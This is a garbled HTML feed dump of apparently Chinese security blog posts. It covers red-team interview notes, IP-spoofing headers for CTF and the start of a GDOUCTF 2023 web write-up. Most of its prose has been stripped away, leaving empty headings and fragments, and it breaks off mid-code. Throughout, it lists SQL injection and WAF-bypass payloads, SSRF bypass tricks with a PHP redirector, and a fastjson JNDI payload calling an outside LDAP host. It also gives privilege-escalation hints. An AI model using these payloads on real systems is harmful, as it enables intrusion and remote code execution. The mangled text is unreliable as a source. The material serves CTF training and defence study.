class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQLfrom for</strong></p><p>SQL<code>substr()</code> ,<code>mid()</code> ,<code>limit</code><code>substr()</code> ,<code>mid()</code> from for</p><pre class="line-numbers language-none"><code class="language-none">from for select substr(database() from 1 for 1)&#x3D;&#39;tyaq&#39;; select mid(database() from 1 for 1)&#x3D;&#39;tyaq&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQL&lt;&gt;</strong></p><p>sql,</p><pre class="line-numbers language-none"><code class="language-none">select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;88<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQLgreatest</strong></p><p>greatest<code>greatest(n1,n2,n3,n4)</code><code>(n1,n2,n3,n4)</code></p><p>sqlgreatestascii</p><pre class="line-numbers language-none"><code class="language-none">select * from cms_users where userid&#x3D;1 and greatest(ascii(substr(database(),1,1)),1)&#x3D;88;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQL</strong></p><p>URLEncodeASCII,HEX,unicode</p><pre class="line-numbers language-none"><code class="language-none">ASCIITest CHAR(55)+CHAR(66)+CHAR(88)+CHAR(99)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>URL</p><pre class="line-numbers language-none"><code class="language-none">URL1+and+1&#x3D;11+%25%36%31%25%36%65%25%36%34+1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>16</p><pre class="line-numbers language-none"><code class="language-none">usersselect column_name from information_schema.tables where table_name&#x3D;users;select column_name from information_schema.tables where table_name&#x3D;0x7573657273;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQL</strong></p><pre class="line-numbers language-none"><code class="language-none">MYSQL &#x2F;!..&#x2F; SQL select * from cms_users where userid&#x3D;1 union &#x2F;*!select*&#x2F; 1,2,3;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><ol><li><strong></strong>SQLSQLSQL</li><li><strong></strong>SQL</li><li><strong>ORM</strong>ORMSQLSQLORMSQL</li><li><strong></strong>WebSQLSQL</li></ol><h2 id="Sql"><a href="#Sql" class="headerlink" title="Sql"></a>Sql</h2><p>,http headerxffcookie</p><h3 id=""><a href="#" class="headerlink" title=""></a><strong></strong></h3><p>1.GBK<br> 2.POGETSTcookienull  \  </p><h3 id=""><a href="#" class="headerlink" title=""></a><strong></strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root %df' or <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span><span class="token comment"># :GBK,%5c,%df%df%5c%df%5cMysql</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p> addslashes get_magic_quotes_gpcmysql_escape_stringmysql_real_escape_stringaddslashes \ \SQL<br></p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p></p><p>floor()</p><p>exp()</p><p>convert()</p><p>updataxml()&lt;32</p><p>name_const()</p><p>extractvalue()&lt;32</p><h2 id="XXEXMl"><a href="#XXEXMl" class="headerlink" title="XXEXMl"></a>XXEXMl</h2><p><strong>XXE</strong>xmlxmlDos</p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>burpHTTPContent-TypeXXE</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><img src="https://pic1.zhimg.com/80/v2-74875be6a3bcbd97e58dc00d86f571e0_1440w.webp" alt="123"></p><ol><li>A</li><li>Acookie</li><li>AB</li><li>BA</li><li>cookieAAB</li></ol><p>a Acookie</p><p>b AB</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF</p><p>URL</p><p></p><p>SSRFweb</p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p><strong>1.@</strong></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.xxx.com@www.kxsy.work&#x2F;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>1@22</p><p><strong>2.IP</strong></p><p>IP</p><p><strong>3.</strong></p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.985.so&#x2F;http:&#x2F;&#x2F;www.kxsy.work&#x2F; &#x3D; http:&#x2F;&#x2F;u6.gg&#x2F;ks69x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>4.</strong></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.kxsy.work&#x2F; &#x3D; http:&#x2F;&#x2F;wwwkxsywork&#x2F;localhost0.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>5.302</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;?php  $schema &#x3D; $_GET[&#39;s&#39;];$ip     &#x3D; $_GET[&#39;i&#39;];$port   &#x3D; $_GET[&#39;p&#39;];$query  &#x3D; $_GET[&#39;q&#39;];if(empty($port))&#123;      header(&quot;Location: $schema:&#x2F;&#x2F;$ip&#x2F;$query&quot;); &#125; else &#123;    header(&quot;Location: $schema:&#x2F;&#x2F;$ip:$port&#x2F;$query&quot;); &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>6.xip.io</strong></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.0.0.1.xip.io &#x3D; 10.0.0.1www.10.0.0.1.xip.io&#x3D; 10.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>8. </strong></p><p>File GOPHER</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>JS<strong></strong></p><p>XSS</p><p>XSS</p><p>DOMXSSDOM-XSSurlXSS</p><h2 id="xsscsrf"><a href="#xsscsrf" class="headerlink" title="xsscsrf"></a>xsscsrf</h2><p>**xsscookiexsscookie. **</p><p><strong>csrfcookie</strong></p><h2 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h2><h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><p>DNS</p><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>wafban ipDNSLog<strong>MySQLload_file()DNSLogload_file()<code>www.baidu.com</code>url</strong></p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>urlDNSDNSLogipssrf</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>xssxssxss</p><h3 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h3><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>payloadcontent-typeapplication&#x2F;jsondnslog{zeo:{@type:java.net.Inet4Address,val:ntel8h.dnslog.cn}}payload</p><pre class="line-numbers language-none"><code class="language-none">&#123;    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;ntel8h.dnslog.cn&#x2F;test&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://mp.weixin.qq.com/s/SaoEAe5jB7vE5uoY2YOKbg">DNSLog (qq.com)</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><p>weblogicT3XML</p><p>1.<strong>T3</strong>(CVE-2015-4582CVE-2016-0638CVE-2016-3510CVE-2020-2555CVE-2020-2883)<br>2.<strong>T3</strong><strong>RMP</strong><strong>ND</strong>(CVE2017-3248CVE2018-2628CVE2018-2893CVE2018-3245CVE-2018-3191CVE-2020-14644CVE-2020-14645)<strong>IIOP</strong>CVE-2020-2551<br>3. javabean <strong>XML</strong>(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729)</p><p><strong>xml</strong><strong>xmldecode</strong>xml</p><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>jspayloadjson@typefastjson</p><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p><strong>shiro550</strong></p><p><strong>RememberMe</strong></p><p>cookierce</p><p><strong>shiro721:</strong></p><p>shiro721cookiecookierce</p><h3 id="log4j-1"><a href="#log4j-1" class="headerlink" title="log4j"></a>log4j</h3><p>Log4j2 JNDI Log4j2 </p><p><strong></strong>${xxxxxx}</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="cs"><a href="#cs" class="headerlink" title="cs"></a><strong>cs</strong></h3><p>httpCShttp </p><p>A. <strong></strong> </p><p>a)  </p><p>B. <strong>&#x2F;IP</strong> </p><p>a) CDNIP</p><p>b) CDNIP </p><p>C. <strong></strong> </p><p>a) serverdll </p><p>b) clientPOSTbodybase64 </p><p>c) POSTGET </p><p>D. <strong></strong> </p><p>a) jqeury*.js</p><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a><strong>MSF</strong></h3><p>1msf4444</p><p>2msf:(meterpreterrevshell)</p><h3 id=""><a href="#" class="headerlink" title=":"></a><strong>:</strong></h3><p><strong>2.03.0</strong></p><p><strong>1RC4AES</strong></p><p><strong>22.0c++3.0java</strong></p><p><strong>3getpost</strong>content-type<strong>application&#x2F;octet-stream</strong></p><p>4.01uaua</p><p>2Content-type: Application&#x2F;x-www-form-urlencoded</p><p>3acceptAccept:application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01</p><p>4.0</p><h3 id=""><a href="#" class="headerlink" title=":"></a><strong>:</strong></h3><p>1cookieCookie  **;**</p><p>2paylodjspxc,passJavabase64phpasp</p><h3 id=""><a href="#" class="headerlink" title=""></a><strong></strong></h3><p>1ua</p><p>2eavlbase64<br>3payloadbase64</p><p>4.X-Forwarded-For</p><h3 id=""><a href="#" class="headerlink" title=""></a><strong></strong></h3><p>1payloadPhpassertevalasp evaljspJavaClassLoaderbase64</p><p>2@ini_set(diplay_erors,0);@set_time_limit(0)base64</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">PUT</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">CRLF</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><pre class="line-numbers language-none"><code class="language-none">SSRFwar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><strong>windows</strong>dllvps</p><p>**linux:**</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>url</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong></strong>fofaurl</p><p>IPCDN<strong></strong></p><p>cmscmscms</p><p><strong></strong></p><p><strong>C</strong>C</p><p></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>AWVS,Appscan,Nessuss</p><p>webshell</p><p></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><p></p><p>SQLsql</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>1.ipipip<br>ssh,3389cs<br>1.shirovpsipipwhoisqq</p><p>4.webshell<br>2..<br>(Linux),shell,.,.<br>(windows).<br>web,web?.<br>5.<br>1.GETPOSTGETcontentwebshellPOST</p><h2 id=""><a href="#" class="headerlink" title=""></a><strong></strong></h2><p>1.</p><ul><li>IP</li><li></li><li></li><li> URL </li><li> ID</li></ul><p> 2.</p><ul><li>IP <br>IP   IP<br> IP </li><li>ID <br>ID <br> ID </li><li> url<br> Whois    <br> IP &#x2F;</li><li><br>IDC2 <br> ID  QQ</li><li><br> JSONP  IP <br> jsonp </li></ul><p> 3.</p><ul><li></li></ul><p>DDOS <br> IPC2 <br>Web</p><ul><li></li></ul><p>ID<br><br>qq&#x2F;<br></p><h2 id=""><a href="#" class="headerlink" title=""></a><strong></strong></h2><p>1.<strong></strong></p><p>2.<strong></strong>SQLSELECTSQLSQL</p><p>3.<strong></strong>AWVSAPPSCANuser-agent</p><p>4.<strong></strong></p><p>5.<strong></strong></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>1.<strong></strong></p><p>2.<strong></strong>IP</p><p>3.<strong></strong></p><p>4.<strong></strong>()ProcessHackerRkhunter,</p><p>5.<strong></strong><br>6.</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>windows,,,,,,,web.</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>tcp TCP <strong>SSH</strong></p><p>udp UDP  UDP <strong></strong></p><p>http 80 </p><p>https SSL  443  SSL</p><h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><p>IPIPIPIP</p><p>IP</p><ol><li><p><strong>WAF</strong>IP</p></li><li><p><strong>IDS</strong>IP</p></li><li><p>CFIP</p></li><li><h5 id="IPIPIP"><a href="#IPIPIP" class="headerlink" title="IPIPIP"></a>IPIPIP</h5></li></ol><h2 id="id"><a href="#id" class="headerlink" title="id:"></a>id:</h2><p>4624 <br>4625 <br>4634 <br>4647 <br>4672 &#x2F;<br>4720 </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>CPUGPU</p><p><img src="https://img-blog.csdnimg.cn/img_convert/96df0c3d9adc28f32537fa7df52fe736.jpg" alt="1"></p><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p> [3] </p><p>(1) [3] </p><p>(2) [3] </p><p>(3) [3] </p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>()IP</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><p><img src="https://img-blog.csdnimg.cn/img_convert/dba35b1c085dc28b692e4d0f9770e8ed.jpg" alt="lesuo"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>OfficeOfficeOffice</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>Kerberos,ClientAS(),ASClient<br>Logon Session KeyTGT,Logon Session KeyKDCkrbtgtNTLM Hash,krbtgtNTLM HashTGTLogon Session KeyClientTGS,AS,,</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><strong></strong><br>:TGTKerberos</p><p>:STCIFS<br><strong></strong><br>: KDCAS<br>:KDCServer<br><strong></strong><br>: krbtgt NTLM Hash <br>:  NTLM Hash </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>1. su  root </p><p>2.</p><p>3.SUIDSUIDrootSUIDroot</p><p>4.findfindfind SUID  find  root </p><h3 id="window"><a href="#window" class="headerlink" title="window"></a>window</h3><p><strong>1</strong></p><p><strong>#</strong></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">systeminfo  #wmic qfe get Description,HotFixID,InstalledOn  #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>#MSF</strong></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">post/windows/gather/enum_patches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2at</strong></p><p><strong>Windows2000Windows 2003Windows XP atsystem</strong></p><p><strong>3.</strong></p><pre class="line-numbers language-none"><code class="language-none">udfmysqlmysqlrootsystemmofwindowsc:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof systemmof<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>4.MS14-068 </strong></p><p>,<a href="https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7&spm=1001.2101.3001.7020"></a>dcpac,</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>**1.**sshroot</p><p>**2.**8</p><p>**3.**35</p><p>**4.**surootwheelsuroot</p><p>**5.**ICMP</p><p>**6.**10</p><p><strong>7.</strong> </p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h3><p><strong>1.</strong>  <strong>3389</strong></p><p><strong>2.</strong>  <strong>SAM</strong>SAM</p><p><strong>3.<strong></strong></strong></p><p><strong>4.</strong>  <strong></strong></p><p><strong>5.</strong>  <strong>445</strong></p><p><strong>6.</strong>  <strong></strong></p><p><strong>7.</strong>  <strong>windows</strong>830</p><p><strong>8.</strong>  Windows<strong>ping</strong>338980</p><p><strong>9.</strong>  <strong></strong></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="1-"><a href="#1-" class="headerlink" title="1."></a>1.</h3><p></p><p>a</p><p>bWin+R<code>eventvwr.msc</code></p><p>cLog Parser</p><h3 id="2-web"><a href="#2-web" class="headerlink" title="2.web"></a>2.web</h3><p></p><p>aweb</p><p>b</p><ul><li>WindowsEmEditor</li><li>LinuxShell</li></ul><h2 id="shellshell"><a href="#shellshell" class="headerlink" title="shellshell"></a><strong>shellshell</strong></h2><p> shell<br> shell</p><h2 id="DMZTrustUntrust"><a href="#DMZTrustUntrust" class="headerlink" title="DMZTrustUntrust"></a>DMZTrustUntrust</h2><h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><p> 1.DMZInternetDMZ<br> 2.  ,.<br> DMZ,.<br>Trust</p><h3 id="Trust"><a href="#Trust" class="headerlink" title="Trust"></a>Trust</h3><p> ..DMZ.<br> trust<br> DMZtrust</p><h3 id="Untrust"><a href="#Untrust" class="headerlink" title="Untrust"></a>Untrust</h3><p> ,internet,<br> untrustDMZ,trust**</p>]]></content>
      
      
      <categories>
          
          <category> hvv </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF iphttp</title>
      <link href="/2023/05/13/CTF-%E7%94%A8%E4%BA%8E%E4%BC%AA%E9%80%A0ip%E7%9A%84http%E8%AF%B7%E6%B1%82%E5%A4%B4/"/>
      <url>/2023/05/13/CTF-%E7%94%A8%E4%BA%8E%E4%BC%AA%E9%80%A0ip%E7%9A%84http%E8%AF%B7%E6%B1%82%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<h3 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For:"></a>X-Forwarded-For:</h3><p>IP</p><h3 id="Client-ip"><a href="#Client-ip" class="headerlink" title="Client-ip:"></a>Client-ip:</h3><p>IP</p><h3 id="X-Client-IP"><a href="#X-Client-IP" class="headerlink" title="X-Client-IP:"></a>X-Client-IP:</h3><p>IP</p><h3 id="X-Remote-IP"><a href="#X-Remote-IP" class="headerlink" title="X-Remote-IP:"></a>X-Remote-IP:</h3><p>IP</p><h3 id="X-Rriginating-IP"><a href="#X-Rriginating-IP" class="headerlink" title="X-Rriginating-IP:"></a>X-Rriginating-IP:</h3><p>IPIP</p><h3 id="X-Remote-addr"><a href="#X-Remote-addr" class="headerlink" title="X-Remote-addr:"></a>X-Remote-addr:</h3><p>IP</p><h3 id="HTTP-CLIENT-IP"><a href="#HTTP-CLIENT-IP" class="headerlink" title="HTTP_CLIENT_IP:"></a>HTTP_CLIENT_IP:</h3><p>HTTPIPHTTP</p><h3 id="X-Real-IP"><a href="#X-Real-IP" class="headerlink" title="X-Real-IP:"></a>X-Real-IP:</h3><p>IP</p><h3 id="X-Originating-IP"><a href="#X-Originating-IP" class="headerlink" title="X-Originating-IP:"></a>X-Originating-IP:</h3><p>IPHTTPHTTP</p><h3 id="via"><a href="#via" class="headerlink" title="via:"></a>via:</h3><p> IP </p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDOUCTF 2023</title>
      <link href="/2023/04/17/GDOUCTF-2023/"/>
      <url>/2023/04/17/GDOUCTF-2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h3><p><strong>JS</strong><br><img src="https://img-blog.csdnimg.cn/83a1d5e00991490b8df76fbf9ff9b211.png" alt="1"><br>F12jsspeed<br><img src="https://img-blog.csdnimg.cn/17ccc8f0652c48a4936ccf77acc9ec2a.png" alt="2"><br>**this.speed;**flag<br><img src="https://img-blog.csdnimg.cn/17dfe7a150b248e5bae600152eb3f4be.png" alt="2"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong></strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'j0k3r'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                  <span class="token variable">$aaa</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  <span class="token variable">$bbb</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token operator">==</span><span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$bbb</span><span class="token operator">==</span><span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$aaa</span><span class="token operator">!=</span><span class="token variable">$bbb</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                   <span class="token variable">$give</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cancanwordflag'</span><span class="token punctuation">;</span>                   <span class="token variable">$get</span> <span class="token operator">=</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">;</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$give</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>                   <span class="token punctuation">&#125;</span>                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                         <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$$value</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                   <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                  <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>                 <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"?"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token 